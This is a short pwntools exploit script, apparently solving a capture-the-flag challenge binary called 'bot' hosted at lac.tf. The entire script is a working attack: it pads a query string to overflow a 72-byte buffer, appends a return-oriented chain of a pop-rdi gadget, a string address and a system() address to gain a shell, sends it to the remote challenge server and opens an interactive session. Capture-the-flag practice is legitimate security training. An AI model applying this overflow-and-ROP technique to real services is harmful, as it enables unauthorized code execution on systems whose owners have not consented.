from pwn import *

system = 0x00000000004012a1
str = 0x4020f3
pop_rdi = 0x000000000040133b

query = b'give me the flag\0'
payload = query + b'a'*(72-len(query))
payload += p64(pop_rdi) + p64(str) + p64(system)

# io = process('./bot')
# gdb.attach(io, api=True)
io = remote('lac.tf', 31180)


io.sendline(payload)
io.interactive()
